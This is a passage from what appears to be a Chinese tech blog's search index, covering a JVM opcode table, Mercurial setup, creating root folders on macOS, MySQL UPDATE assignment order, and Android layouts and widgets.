将第四个long型本地变量推送至栈顶 |\n| 0x22 | fload_0 | 将第一个float型本地变量推送至栈顶 |\n| 0x23 | fload_1 | 将第二个float型本地变量推送至栈顶 |\n| 0x24 | fload_2 | 将第三个float型本地变量推送至栈顶 |\n| 0x25 | fload_3 | 将第四个float型本地变量推送至栈顶 |\n| 0x26 | dload_0 | 将第一个double型本地变量推送至栈顶 |\n| 0x27 | dload_1 | 将第二个double型本地变量推送至栈顶 |\n| 0x28 | dload_2 | 将第三个double型本地变量推送至栈顶 |\n| 0x29 | dload_3 | 将第四个double型本地变量推送至栈顶 |\n| 0x2a | aload_0 | 将第一个引用类型本地变量推送至栈顶 |\n| 0x2b | aload_1 | 将第二个引用类型本地变量推送至栈顶 |\n| 0x2c | aload_2 | 将第三个引用类型本地变量推送至栈顶 |\n| 0x2d | aload_3 | 将第四个引用类型本地变量推送至栈顶 |\n| 0x2e | iaload | 将int型数组指定索引的值推送至栈顶 |\n| 0x2f | laload | 将long型数组指定索引的值推送至栈顶 |\n| 0x30 | faload | 将float型数组指定索引的值推送至栈顶 |\n| 0x31 | daload | 将double型数组指定索引的值推送至栈顶 |\n| 0x32 | aaload | 将引用类型数组指定索引的值推送至栈顶 |\n| 0x33 | baload | 将boolean或byte型数组指定索引的值推送至栈顶 |\n| 0x34 | caload | 将char型数组指定索引的值推送至栈顶 |\n| 0x35 | saload | 将short型数组指定索引的值推送至栈顶 |\n| 0x36 | istore | 将栈顶int型数值存入指定本地变量 |\n| 0x37 | lstore | 将栈顶long型数值存入指定本地变量 |\n| 0x38 | fstore | 将栈顶float型数值存入指定本地变量 |\n| 0x39 | dstore | 将栈顶double型数值存入指定本地变量 |\n| 0x3a | astore | 将栈顶引用类型数值存入指定本地变量 |\n| 0x3b | istore_0 | 将栈顶int型数值存入第一个本地变量 |\n| 0x3c | istore_1 | 将栈顶int型数值存入第二个本地变量 |\n| 0x3d | istore_2 | 将栈顶int型数值存入第三个本地变量 |\n| 0x3e | istore_3 | 将栈顶int型数值存入第四个本地变量 |\n| 0x3f | lstore_0 | 将栈顶long型数值存入第一个本地变量 |\n| 0x40 | lstore_1 | 将栈顶long型数值存入第二个本地变量 |\n| 0x41 | lstore_2 | 将栈顶long型数值存入第三个本地变量 |\n| 0x42 | lstore_3 | 将栈顶long型数值存入第四个本地变量 |\n| 0x43 | fstore_0 | 将栈顶float型数值存入第一个本地变量 |\n| 0x44 | fstore_1 | 将栈顶float型数值存入第二个本地变量 |\n| 0x45 | fstore_2 | 将栈顶float型数值存入第三个本地变量 |\n| 0x46 | fstore_3 | 将栈顶float型数值存入第四个本地变量 |\n| 0x47 | dstore_0 | 将栈顶double型数值存入第一个本地变量 |\n| 0x48 | dstore_1 | 将栈顶double型数值存入第二个本地变量 |\n| 0x49 | dstore_2 | 将栈顶double型数值存入第三个本地变量 |\n| 0x4a | dstore_3 | 将栈顶double型数值存入第四个本地变量 |\n| 0x4b | astore_0 | 将栈顶引用型数值存入第一个本地变量 |\n| 0x4c | astore_1 | 将栈顶引用型数值存入第二个本地变量 |\n| 0x4d | astore_2 | 将栈顶引用型数值存入第三个本地变量 |\n| 0x4e | astore_3 | 将栈顶引用型数值存入第四个本地变量 |\n| 0x4f | iastore | 将栈顶int型数值存入指定数组的指定索引位置 |\n| 0x50 | lastore | 将栈顶long型数值存入指定数组的指定索引位置 |\n| 0x51 | fastore | 将栈顶float型数值存入指定数组的指定索引位置 |\n| 0x52 | dastore | 将栈顶double型数值存入指定数组的指定索引位置 |\n| 0x53 | aastore | 将栈顶引用型数值存入指定数组的指定索引位置 |\n| 0x54 | bastore | 将栈顶boolean或byte型数值存入指定数组的指定索引位置 |\n| 0x55 | castore | 将栈顶char型数值存入指定数组的指定索引位置 |\n| 0x56 | sastore | 将栈顶short型数值存入指定数组的指定索引位置 |\n| 0x57 | pop | 将栈顶数值弹出(数值不能是long或double类型的) |\n| 0x58 | pop2 | 将栈顶的一个(对于非long或double类型)或两个数值(对于非long或double的其他类型)弹出 |\n| 0x59 | dup | 复制栈顶数值并将复制值压入栈顶 |\n| 0x5a | dup_x1 | 复制栈顶数值并将两个复制值压入栈顶 |\n| 0x5b | dup_x2 | 复制栈顶数值并将三个(或两个)复制值压入栈顶 |\n| 0x5c | dup2 | 复制栈顶一个(对于long或double类型)或两个(对于非long或double的其他类型)数值并将复制值压入栈顶 |\n| 0x5d | dup2_x1 | dup_x1指令的双倍版本 |\n| 0x5e | dup2_x2 | dup_x2指令的双倍版本 |\n| 0x5f | swap | 将栈顶最顶端的两个数值互换(数值不能是long或double类型) |\n| 0x60 | iadd | 将栈顶两int型数值相加并将结果压入栈顶 |\n| 0x61 | ladd | 将栈顶两long型数值相加并将结果压入栈顶 |\n| 0x62 | fadd | 将栈顶两float型数值相加并将结果压入栈顶 |\n| 0x63 | dadd | 将栈顶两double型数值相加并将结果压入栈顶 |\n| 0x64 | isub | 将栈顶两int型数值相减并将结果压入栈顶 |\n| 0x65 | lsub | 将栈顶两long型数值相减并将结果压入栈顶 |\n| 0x66 | fsub | 将栈顶两float型数值相减并将结果压入栈顶 |\n| 0x67 | dsub | 将栈顶两double型数值相减并将结果压入栈顶 |\n| 0x68 | imul | 将栈顶两int型数值相乘并将结果压入栈顶 |\n| 0x69 | lmul | 将栈顶两long型数值相乘并将结果压入栈顶 |\n| 0x6a | fmul | 将栈顶两float型数值相乘并将结果压入栈顶 |\n| 0x6b | dmul | 将栈顶两double型数值相乘并将结果压入栈顶 |\n| 0x6c | idiv | 将栈顶两int型数值相除并将结果压入栈顶 |\n| 0x6d | ldiv | 将栈顶两long型数值相除并将结果压入栈顶 |\n| 0x6e | fdiv | 将栈顶两float型数值相除并将结果压入栈顶 |\n| 0x6f | ddiv | 将栈顶两double型数值相除并将结果压入栈顶 |\n| 0x70 | irem | 将栈顶两int型数值作取模运算并将结果压入栈顶 |\n| 0x71 | lrem | 将栈顶两long型数值作取模运算并将结果压入栈顶 |\n| 0x72 | frem | 将栈顶两float型数值作取模运算并将结果压入栈顶 |\n| 0x73 | drem | 将栈顶两double型数值作取模运算并将结果压入栈顶 |\n| 0x74 | ineg | 将栈顶int型数值取负并将结果压入栈顶 |\n| 0x75 | lneg | 将栈顶long型数值取负并将结果压入栈顶 |\n| 0x76 | fneg | 将栈顶float型数值取负并将结果压入栈顶 |\n| 0x77 | dneg | 将栈顶double型数值取负并将结果压入栈顶 |\n| 0x78 | ishl | 将int型数值左移指定位数并将结果压入栈顶 |\n| 0x79 | lshl | 将long型数值左移指定位数并将结果压入栈顶 |\n| 0x7a | ishr | 将int型数值右(带符号)移指定位数并将结果压入栈顶 |\n| 0x7b | lshr | 将long型数值右(带符号)移指定位数并将结果压入栈顶 |\n| 0x7c | iushr | 将int型数值右(无符号)移指定位数并将结果压入栈顶 |\n| 0x7d | lushr | 将long型数值右(无符号)移指定位数并将结果压入栈顶 |\n| 0x7e | iand | 将栈顶两int型数值\"按位与\"并将结果压入栈顶 |\n| 0x7f | land | 将栈顶两long型数值\"按位与\"并将结果压入栈顶 |\n| 0x80 | ior | 将栈顶两int型数值\"按位或\"并将结果压入栈顶 |\n| 0x81 | lor | 将栈顶两long型数值\"按位或\"并将结果压入栈顶 |\n| 0x82 | ixor | 将栈顶两int型数值\"按位异或\"并将结果压入栈顶 |\n| 0x83 | lxor | 将栈顶两long型数值\"按位异或\"并将结果压入栈顶 |\n| 0x84 | iinc | 将指定int型变量增加指定值(如i++, i--, i+=2等) |\n| 0x85 | i2l | 将栈顶int型数值强制转换为long型数值并将结果压入栈顶 |\n| 0x86 | i2f | 将栈顶int型数值强制转换为float型数值并将结果压入栈顶 |\n| 0x87 | i2d | 将栈顶int型数值强制转换为double型数值并将结果压入栈顶 |\n| 0x88 | l2i | 将栈顶long型数值强制转换为int型数值并将结果压入栈顶 |\n| 0x89 | l2f | 将栈顶long型数值强制转换为float型数值并将结果压入栈顶 |\n| 0x8a | l2d | 将栈顶long型数值强制转换为double型数值并将结果压入栈顶 |\n| 0x8b | f2i | 将栈顶float型数值强制转换为int型数值并将结果压入栈顶 |\n| 0x8c | f2l | 将栈顶float型数值强制转换为long型数值并将结果压入栈顶 |\n| 0x8d | f2d | 将栈顶float型数值强制转换为double型数值并将结果压入栈顶 |\n| 0x8e | d2i | 将栈顶double型数值强制转换为int型数值并将结果压入栈顶 |\n| 0x8f | d2l | 将栈顶double型数值强制转换为long型数值并将结果压入栈顶 |\n| 0x90 | d2f | 将栈顶double型数值强制转换为float型数值并将结果压入栈顶 |\n| 0x91 | i2b | 将栈顶int型数值强制转换为byte型数值并将结果压入栈顶 |\n| 0x92 | i2c | 将栈顶int型数值强制转换为char型数值并将结果压入栈顶 |\n| 0x93 | i2s | 将栈顶int型数值强制转换为short型数值并将结果压入栈顶 |\n| 0x94 | lcmp | 比较栈顶两long型数值大小, 并将结果(1, 0或-1)压入栈顶 |\n| 0x95 | fcmpl | 比较栈顶两float型数值大小, 并将结果(1, 0或-1)压入栈顶; 当其中一个数值为NaN时, 将-1压入栈顶 |\n| 0x96 | fcmpg | 比较栈顶两float型数值大小, 并将结果(1, 0或-1)压入栈顶; 当其中一个数值为NaN时, 将1压入栈顶 |\n| 0x97 | dcmpl | 比较栈顶两double型数值大小, 并将结果(1, 0或-1)压入栈顶; 当其中一个数值为NaN时, 将-1压入栈顶 |\n| 0x98 | dcmpg | 比较栈顶两double型数值大小, 并将结果(1, 0或-1)压入栈顶; 当其中一个数值为NaN时, 将1压入栈顶 |\n| 0x99 | ifeq | 当栈顶int型数值等于0时跳转 |\n| 0x9a | ifne | 当栈顶int型数值不等于0时跳转 |\n| 0x9b | iflt | 当栈顶int型数值小于0时跳转 |\n| 0x9c | ifge | 当栈顶int型数值大于等于0时跳转 |\n| 0x9d | ifgt | 当栈顶int型数值大于0时跳转 |\n| 0x9e | ifle | 当栈顶int型数值小于等于0时跳转 |\n| 0x9f | if_icmpeq | 比较栈顶两int型数值大小, 当结果等于0时跳转 |\n| 0xa0 | if_icmpne | 比较栈顶两int型数值大小, 当结果不等于0时跳转 |\n| 0xa1 | if_icmplt | 比较栈顶两int型数值大小, 当结果小于0时跳转 |\n| 0xa2 | if_icmpge | 比较栈顶两int型数值大小, 当结果大于等于0时跳转 |\n| 0xa3 | if_icmpgt | 比较栈顶两int型数值大小, 当结果大于0时跳转 |\n| 0xa4 | if_icmple | 比较栈顶两int型数值大小, 当结果小于等于0时跳转 |\n| 0xa5 | if_acmpeq | 比较栈顶两引用型数值, 当结果相等时跳转 |\n| 0xa6 | if_acmpne | 比较栈顶两引用型数值, 当结果不相等时跳转 |\n| 0xa7 | goto | 无条件跳转 |\n| 0xa8 | jsr | 跳转至指定的16位offset位置, 并将jsr的下一条指令地址压入栈顶 |\n| 0xa9 | ret | 返回至本地变量指定的index的指令位置(一般与jsr或jsr_w联合使用) |\n| 0xaa | tableswitch | 用于switch条件跳转, case值连续(可变长度指令) |\n| 0xab | lookupswitch | 用于switch条件跳转, case值不连续(可变长度指令) |\n| 0xac | ireturn | 从当前方法返回int |\n| 0xad | lreturn | 从当前方法返回long |\n| 0xae | freturn | 从当前方法返回float |\n| 0xaf | dreturn | 从当前方法返回double |\n| 0xb0 | areturn | 从当前方法返回对象引用 |\n| 0xb1 | return | 从当前方法返回void |\n| 0xb2 | getstatic | 获取指定类的静态域, 并将其压入栈顶 |\n| 0xb3 | putstatic | 为指定类的静态域赋值 |\n| 0xb4 | getfield | 获取指定类的实例域, 并将其压入栈顶 |\n| 0xb5 | putfield | 为指定类的实例域赋值 |\n| 0xb6 | invokevirtual | 调用实例方法 |\n| 0xb7 | invokespecial | 调用超类构建方法, 实例初始化方法, 私有方法 |\n| 0xb8 | invokestatic | 调用静态方法 |\n| 0xb9 | invokeinterface | 调用接口方法 |\n| 0xba | invokedynamic | 调用动态方法 |\n| 0xbb | new | 创建一个对象, 并将其引用引用值压入栈顶 |\n| 0xbc | newarray | 创建一个指定的原始类型(如int, float, char等)的数组, 并将其引用值压入栈顶 |\n| 0xbd | anewarray | 创建一个引用型(如类, 接口, 数组)的数组, 并将其引用值压入栈顶 |\n| 0xbe | arraylength | 获取数组的长度值并压入栈顶 |\n| 0xbf | athrow | 将栈顶的异常抛出 |\n| 0xc0 | checkcast | 检验类型转换, 检验未通过将抛出 ClassCastException |\n| 0xc1 | instanceof | 检验对象是否是指定类的实际, 如果是将1压入栈顶, 否则将0压入栈顶 |\n| 0xc2 | monitorenter | 获得对象的锁, 用于同步方法或同步块 |\n| 0xc3 | monitorexit | 释放对象的锁, 用于同步方法或同步块 |\n| 0xc4 | wide | 扩展本地变量的宽度 |\n| 0xc5 | multianewarray | 创建指定类型和指定维度的多维数组(执行该指令时, 操作栈中必须包含各维度的长度值), 并将其引用压入栈顶 |\n| 0xc6 | ifnull | 为null时跳转 |\n| 0xc7 | ifnonnull | 不为null时跳转 |\n| 0xc8 | goto_w | 无条件跳转(宽索引) |\n| 0xc9 | jsr_w | 跳转至指定的32位offset位置, 并将jsr_w的下一条指令地址压入栈顶 |\n\n\n推荐阅读：\n- [字节码增强技术探索 - 美团技术团队](https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html)","categories":["Java"],"tags":["Java","JVM","指令集","Instruction"]},{"title":"hg clone 与 Mercurial","url":"/2021/01/mercurial/","content":"\nMercurial是跨平台的分布式版本控制软件，主要由Python语言实现，但也包含用C语言实现的二进制比较工具。Mercurial一开始的主要运行平台是Linux，现在Mercurial已经移植到Windows、Mac OS X和大多数的类Unix系统中。Mercurial主要由命令行程序组成，现在也有了图形用户界面。对Mercurial的所有操作都由用不同的关键字作为参数调用程序“hg”来实现，Hg是参考水银的化学符号而取的名字。\n\nMercurial的主要设计目标包括高性能、可扩展性、分散性、完全分布式合作开发、能同时高效地处理纯文本和二进制文件，以及分支和合并功能，以此同时保持系统的简洁性[1]。Mercurial也包括一个集成的Web界面。\n\nMercurial的创建者和主要开发人员是Matt Mackal。其源代码采用GNU通用公共许可证第二版为授权，确保了Mercurial是一个自由软件。\n\n<!-- more -->\n\n## 获取 Mercurial\n\nMercurial 官方网站：https://www.mercurial-scm.org/\n\n我们可以从官方网站上获取到软件安装包：https://www.mercurial-scm.org/downloads\n\n还可以根据系统选择合适安装方式安装命令行工具：\n\n```\n# Debian/Ubuntu\n$ apt-get install mercurial\n\n# Fedora\n$ dnf install mercurial\n\n# Gentoo\n$ emerge mercurial\n\n# Mac OS (homebrew)\n$ brew install mercurial\n\n# FreeBSD\n$ cd /usr/ports/devel/mercurial\n$ make install\n\n# Solaris 11 Express\n$ pkg install SUNWmercurial\n```\n\n## 使用 hg 命令行工具 clone 软件仓库\n\n比如 OpenJDK 的软件仓库：\n\n```\nhg clone https://hg.openjdk.java.net/jdk/jdk11\n```","categories":["版本控制"],"tags":["hg","Mercurial"]},{"title":"如何在macOS根目录创建文件夹","url":"/2021/02/create-folder-in-macos-root/","content":"\n在短短的两个月里，已经遇到了 2 次这个问题，第 1 次是 macOS@Catalina 版本，第 2 次是升级后的 macOS@Big Sur 版本，在这里记录一下解决办法。\n\n## macOS@Catalina 版本\n\n重启系统进入恢复模式，关闭 SIP，重启后命令行执行下面这行代码，再创建文件夹就能成功了。\n\n```shell\nsudo mount -uw /\n```\n\n## macOS@Big Sur 版本\n\n重启系统进入恢复模式，关闭 SIP（不确定有没有这个步骤，如果有人尝试可以评论一下），接下来稍稍麻烦一点，修改 /etc/synthetic.conf 文件\n\n<!-- more -->\n\n```shell\nsudo vi /etc/synthetic.conf\n```\n\n输入如下内容，data 换成你要创建的文件夹，后面是映射目录，注意，中间是 Tab，不是空格\n\n```shell\ndata    /private/data\n```\n\n重启系统后，系统根目录出现了对应的文件夹，这个文件夹是一个软链接，链接到了前面写的映射目录中。\n\n如图，我在我电脑根目录下创建了一个 home 文件夹的软链接，实际存储在 /private/home 这个文件夹中。\n\n![根目录下的home文件夹](https://up-img.yonghong.tech/pic/2021/02/27-12-28-%E6%88%AA%E5%B1%8F2021-02-26%20%E4%B8%8B%E5%8D%888.41.34-ovojux.png)\n\n这是我的 /etc/synthetic.conf 文件内容：\n\n```shell\n➜  ~ cat /etc/synthetic.conf\nhome\t/private/home\n```\n\n## 相关文档\n\n- [Mac升级到big sur之后，根目录无法写入文件如何解决？](https://newsn.net/say/mac-big-sur-root-readonly.html)\n- [macOS 开启或关闭 SIP](https://sspai.com/post/55066)\n- [关于基于 Intel 的 Mac 电脑上的 macOS 恢复功能](https://support.apple.com/zh-cn/HT201314)\n","categories":["macOS"],"tags":["macOS"]},{"title":"MySQL update 语句 set 顺序","url":"/2021/03/mysql-update-set-order/","content":"\n绝大多数数据库，在执行 update 语句时，update t set a = b, b = a 便可实现 a、b 列值互换，赋值表达式右侧的值取的都是原始值。MySQL 则是例外，其单表更新是自左到右依次完成，即先完成 a = b，然后在完成 b = a (此时 a = b），所以执行结果变成 a、b 列都是 b，然后多表更新则又不尊从该更新法则。\n\n这个问题源于业务中一次对券有效期进行延期的操作，需求是对优惠券有效期延期 35 天。\n\n- 一部分券在生效中，直接修改过期时间即可；\n- 一部分券已经过期，修改过期时间后，需要判断一下是否仍然是过期的还是生效中的，修改券的状态\n\n<!-- more -->\n所以 SQL 语句大致如下：\n\n```sql\nUPDATE coupon \nSET end_time = DATE_ADD(end_time, INTERVAL 35 DAY), \nstatus = (CASE WHEN end_time > NOW() THEN '生效中' ELSE '已过期' END), \ngmt_modify = NOW() \nWHERE ... ;\n```\n\n## 问题引入\n\n这个地方就有个问题，当修改 status 的时候 end_time 到底是原始数据，还是修改后的数据。经过测试，是使用的修改后的数据，接下来去 MySQL 官网中求证一下。\n\n## MySQL 官方文档的说明\n\nMySQL 官网文档中是这样描述的，当你要更新一个列的时候，UPDATE 语句使用的是这列值的当前值。举个例子：下面这个语句从左到右顺序执行，先执行 col1 = col + 1，此时 col1 已经是加 1 后的值了，执行 col2 = col1 的时候，也是加 1 后的值。\n\n```sql\nUPDATE t1 SET col1 = col1 + 1, col2 = col1;\n```\n\n**但是，这个规则只适用于单表的 UPDATE，多表就不适用于这个规则了，多表更新，赋值语句不确保任何给定的顺序执行，可能是原值，也可能是新值。**\n\n## MySQL 如何实现两列互换\n\n编程语言中，实现两个变量互换很简单：引入临时变量 tmp，tmp = a，a = b，b = tmp 即可实现 a、b 互换，但是 SQL 中没有临时变量，又如何实现变量互换呢？解决方案还是使用临时变量（只不过临时变量是某数据列的值，然后后面再覆盖该数据列的值），假设有 a b 列，a = 100，b = 1，实现 a b 互换，我们可以使用通用手法：\n\n```sql\na = a + b, 101\nb = a - b, 100\na = a - b, 1\n```\n\n至此，a = 1, b = 100，实现 a、b 值互换，SQL 如下：\n\n```sql\nupdate t set a = a + b, b = a - b, a = a - b;\n```\n\n## MySQL 多表更新的例子\n\n两张表：pur_po_bill_detail（采购单细表），wm_sh_bill_detail（收货单细表），采购后，先根据采购单细表创建收货单，然后根据收货单入库。\n\n**pur_po_bill_detail（采购单细表）**\n\n```sql\nCREATE TABLE `pur_po_bill_detail` (\n  `sid` int(32) NOT NULL AUTO_INCREMENT COMMENT 'id',\n  `bill_id` bigint(64) DEFAULT NULL COMMENT 'po单号id',\n  `bill_no` varchar(100) DEFAULT NULL COMMENT '订单号',\n  `pw_count` decimal(20,4) DEFAULT NULL COMMENT '已入库数量',\n  `th_count` decimal(20,4) DEFAULT NULL COMMENT '不合格数量',\n  `bill_status` varchar(30) DEFAULT NULL COMMENT '状态',\n  ...\n  PRIMARY KEY (`sid`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='采购订单细表';\n```\n\n**wm_sh_bill_detail（收货单细表）**\n\n```sql\nCREATE TABLE `wm_sh_bill_detail` (\n  `sid` int(32) NOT NULL AUTO_INCREMENT COMMENT 'id',\n  `bill_id` bigint(64) DEFAULT NULL COMMENT '收货单id',\n  `bill_no` varchar(30) DEFAULT NULL,\n  `ref_number` varchar(30) DEFAULT NULL '采购单号',\n  `ref_detail_sid` bigint(20) DEFAULT NULL '采购单行项目sid',\n  `sh_count` decimal(20,4) DEFAULT NULL,\n  `in_count` decimal(20,4) DEFAULT NULL,\n  `left_count` decimal(20,4) DEFAULT NULL,\n  ...\n   PRIMARY KEY (`sid`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='收货单细表'\n```\n\n下述sql是在收货单入库时反写采购单细表入库数量、状态。\n\n当采购单行项目：入库数量 + 不合格退货数量 >= 订单数量，状态变成已入库\n\n```sql\nUPDATE pur_po_bill_detail t0, wm_sh_bill_detail t1\nset t0.pw_count = coalesce(t0.pw_count,0) + t1.in_count, \nt0.th_count = coalesce(t0.th_count,0) + coalesce(t1.left_count,0),\nt0.bill_status = case when t0.pw_count + t0.th_count >= t0.goods_count then '已入库' else t0.bill_status end\nWHERE t0.sid = t1.ref_detail_sid and t1.bill_no = 'SH20180001';\n```\n\nsql执行结果失败，系mysql多表更新，在case判断时，t0.pw_count, t0.th_count取到的是原值。所以mysql多表更新需要注意：\n\n赋值语句、case语句尽量避免依赖引用，如本案case使用了赋值语句pw_count,th_count列，所以判断就出问题啦；可通过update语句拆分来实现多表复杂更新目标。\n\n上述update语句拆分，先更新数量，然后更新状态：\n\n```sql\nUPDATE pur_po_bill_detail t0, wm_sh_bill_detail t1\nset t0.pw_count = coalesce(t0.pw_count,0) + t1.in_count, \nt0.th_count = coalesce(t0.th_count,0) + coalesce(t1.left_count,0)\nWHERE t0.sid = t1.ref_detail_sid and t1.bill_no = 'SH20180001';\n\nUPDATE pur_po_bill_detail t0, wm_sh_bill_detail t1\nset t0.bill_status = case when t0.pw_count + t0.th_count >= t0.goods_count then '已入库' else t0.bill_status end\nWHERE t0.sid = t1.ref_detail_sid and t1.bill_no = 'SH20180001';\n```\n\n## 再次回到业务中来\n\n再次回到业务场景中来，如果采用券的过期时间全部更新这种方式的话，先执行 end_time 延期，再去判断是否过期，这个时候使用的 end_time 已经是修改过的了。\n\n其实这种更新方式也没有必要，如果券延期后还是过期的，那么其实也可以不更新券的有效期，那么 SQL 就变成了下面这样的。先过滤出延期后是生效状态的券，在进行更新。\n\n```sql\nUPDATE coupon \nSET end_time = DATE_ADD(end_time, INTERVAL 35 DAY), \nstatus = '生效中', \ngmt_modify = NOW() \nWHERE ... \nAND DATE_ADD(end_time, INTERVAL 35 DAY) > NOW() ;\n```\n\n## MySQL 官方文档原文\n\nIf you access a column from the table to be updated in an expression, [`UPDATE`](https://dev.mysql.com/doc/refman/8.0/en/update.html) uses the current value of the column. For example, the following statement sets `col1` to one more than its current value:\n\n```sql\nUPDATE t1 SET col1 = col1 + 1;\n```\n\nThe second assignment in the following statement sets `col2` to the current (updated) `col1` value, not the original `col1` value. The result is that `col1` and `col2` have the same value. This behavior differs from standard SQL.\n\n```sql\nUPDATE t1 SET col1 = col1 + 1, col2 = col1;\n```\n\nSingle-table [`UPDATE`](https://dev.mysql.com/doc/refman/8.0/en/update.html) assignments are generally evaluated from left to right. For multiple-table updates, there is no guarantee that assignments are carried out in any particular order.\n\n## 参考文档\n\n- [谈谈mysql update语句 set顺序问题、列交换sql实现及多表更新注意事项](https://blog.csdn.net/chuangxin/article/details/84558050)\n- [https://dev.mysql.com/doc/refman/5.7/en/update.html](https://dev.mysql.com/doc/refman/5.7/en/update.html)\n- [https://dev.mysql.com/doc/refman/8.0/en/update.html](https://dev.mysql.com/doc/refman/8.0/en/update.html)\n","categories":["MySQL"],"tags":["数据库","MySQL","UPDATE"]},{"title":"Android 常用布局","url":"/2021/07/android-layout/","content":"\n## LinearLayout 线性布局\n\n常用属性\n- orientation：布局总组件的排列方式 vertical、horizontal\n- gravity：组件所包含的组件的排列方式\n- layout_gravity：组件在父容器里的排列方式\n- background：背景\n- divider：分割线\n- showDividers：分割线所在位置：none, beginning, end, middle\n- dividerPadding：设置分割线的 padding\n- layout_weight：权重，分配剩余空间\n\n<!-- more -->\n\n## RelativeLayout 相对布局\n\n根据父容器定位\n- android:layout_alignParentStart\n- android:layout_alignParentEnd\n- android:layout_alignParentTop\n- android:layout_alignParentBottom\n- android:layout_centerHorizontal\n- android:layout_centerVertical\n- android:layout_centerInParent\n\n根据兄弟组件定位\n- android:layout_toStartOf\n- android:layout_toEndOf\n- android:layout_above\n- android:layout_below\n- android:layout_alignStart\n- android:layout_alignEnd\n- android:layout_alignTop\n- android:layout_alignBottom\n  \nmargin：组件与父容器的边距\n- android:layout_margin\n- android:layout_marginStart\n- android:layout_marginEnd\n- android:layout_marginTop\n- android:layout_marginBottom\n\npadding：组件内部的边距\n- android:padding\n- android:paddingStart\n- android:paddingEnd\n- android:paddingTop\n- android:paddingBottom\n\n\n## FrameLayout 帧布局\n\n常用属性：\n- android:foreground=\"@drawable/ceshi\"\n- android:foregroundGravity=\"right|bottom\"\n\n## TableLayout 表格布局\n\n常用属性\n- android:collapseColumns   隐藏\n- android:stretchColumns    拉伸\n- android:shrinkColumns     收缩\n\n子控件属性\n- android:layout_column     显示在第几列\n- android:layout_span       横向跨几列\n\n\n## GridLayout 网格布局\n\n常用属性\n- android:orientation \n- android:columnCount\n- android:rowCount\n\n子控件属性\n- android:layout_gravity fill、center\n- android:layout_column\n- android:layout_columnSpan\n- android:layout_columnWeight\n- android:layout_row\n- android:layout_rowSpan\n- android:layout_rowWeight\n\n## ConstraintLayout 约束布局\n\nhttps://developer.android.com/training/constraint-layout?hl=zh-cn\n","categories":["Android"],"tags":["Android","布局","Layout","LinearLayout","RelativeLayout","FrameLayout","TableLayout","GridLayout","ConstraintLayout"]},{"title":"Android 常用组件","url":"/2021/07/android-widget/","content":"\n## TextView\n\nTextView 基础属性\n- layout_width：组件宽度\n- layout_height：组件高度\n- id：为 TextView 组件设置一个 id\n- text：设置显示文本的内容\n- textColor：设置字体颜色\n- textStyle：设置字体风格：三种可选值：normal, bold, italic\n- textSize：字体大小，单位一般是用 sp\n- background：控件的背景颜色，可以理解为填充整个控件颜色，可以是图片\n- gravity：设置控件中内容对齐方向\n\n<!-- more -->\n\n带阴影的TextView\n- shadowColor：设置阴影的颜色值\n- shadowRadius：设置阴影的模糊度\n- shadowDx：设置水平偏移\n- shadowDy：设置垂直偏移\n\n跑马灯效果TextView\n- singleLine：设置内容单行显示\n- focusable：是否可以获得焦点\n- focusableInTouchMode：在触摸模式下是否可以获得焦点\n- ellipsize：在哪里省略文本\n- marqueeRepeatLimit：字幕动画重复次数\n\n```xml\n    <TextView\n        android:id=\"@+id/tv_one\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"wrap_content\"\n        android:ellipsize=\"marquee\"\n        android:focusable=\"true\"\n        android:focusableInTouchMode=\"true\"\n        android:marqueeRepeatLimit=\"marquee_forever\"\n        android:singleLine=\"true\"\n        android:text=\"@string/tv_one\">\n\n        <requestFocus />\n    </TextView>\n```\n\n## Button\n\n继承 TextView\n\n三层\n- foreground：前景色、前景图片\n- text：文字内容\n- background：背景色、背景图片\n\n事件处理\n- 点击事件：onClickListener，抬起时触发\n- 长按事件：onLongClickListener，按下指定时长后触发\n- 触摸事件：onTouchListener\n  - 按下(ACTION_DOWN, 0)\n  - 抬起(ACTION_UP, 1)\n  - 移动(ACTION_MOVE, 2)\n\n\n## StateListDrawable\n\nStateListDrawable 是 Drawable 资源的一种，可以根据不同的状态，设置不同的图片效果，关键节点 `<selector>`，我们只需要将 Button 的 background 属性设置为该 drawable 资源即可\n\n常用属性\n- drawable：引用的 Drawable 资源\n- state_focused：是否获得焦点\n- state_pressed：控件是否被按下\n- state_enabled：控件是否可用\n- state_selected：控件是够被选择，针对有滚动的情况\n- state_checked：控件是否被勾选\n- state_checkable：控件可否被勾选\n- state_window_focused：是否获得窗口焦点\n- state_active：控件是否处于活跃状态\n- state_single：控件包含多个子控件时，确定是否只显示一个控件\n- state_first：控件包含多个子控件时，确定第一个控件是否处于显示状态\n- state_middle：控件包含多个子控件时，确定中间一个控件是否处于显示状态\n- state_last：控件包含多个子控件时，确定最后一个控件是否处于显示状态\n\n## EditText\n\n继承 TextView\n\n常用属性\n- hint：输入提示\n- textColorHint：输入提示文字颜色\n- inputType：输入类型\n- drawableXxxx：在输入框的指定方位添加图片\n- drawablePadding：设置图片与文字间距\n- padding：设置内容与边框边距\n- background：背景色\n\n## ImageView\n\n常用属性\n- src：设置图片资源\n- scaleType：设置图片缩放类型\n- maxHeight：最大高度\n- maxWidth：最大宽度\n- adjustViewBounds：调整View的界限\n\n缩放类型\n- fitStart：保持宽高比缩放图片，缩放完成后在 ImageView 的左上角\n- fitCenter：默认，保持宽高比缩放图片，缩放后放于中间\n- fitEnd：保持宽高比缩放图片，缩放后在 ImageView 的右下角 \n- fitXY：对图像的纵横方向进行独立缩放，使得图片完全适应 ImageView，但是图片宽高比可能会发生变化\n- center：保持原图大小，显示在 ImageView 中心，当原图大于 ImageView 的 size，会进行适当裁剪\n- centerCrop：保持宽高比缩放图片，直到完全覆盖 ImageView，可能会出现图片显示的不完全\n- centerInside：保持宽高比缩放图片，直到 ImageView 能够完全的显示图片\n- matrix：不改变原图大小，从 ImageView 左上角开始绘制原图，超出部分做裁剪处理\n\n## ProgressBar\n\n常用属性\n- max：进度条的最大值\n- progress：进度条已完成进度\n- indeterminate：如果设置成 true，则进度条不精确显示进度\n- style=\"?android:attr/progressBarStyleHorizontal\"：水平进度条\n\n## Notification\n\n- NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);\n- NotificationChannel（Build.VERSION.SDK_INT >= Build.VERSION_CODES.O）\n- NotificationCompat.Builder()\n- Notification\n- PendingIntent\n\n通知重要程度设置\n- IMPORTANCE_NONE：关闭通知\n- IMPORTANCE_MIN：开启通知，不会弹出，没有提示音，状态栏无显示\n- 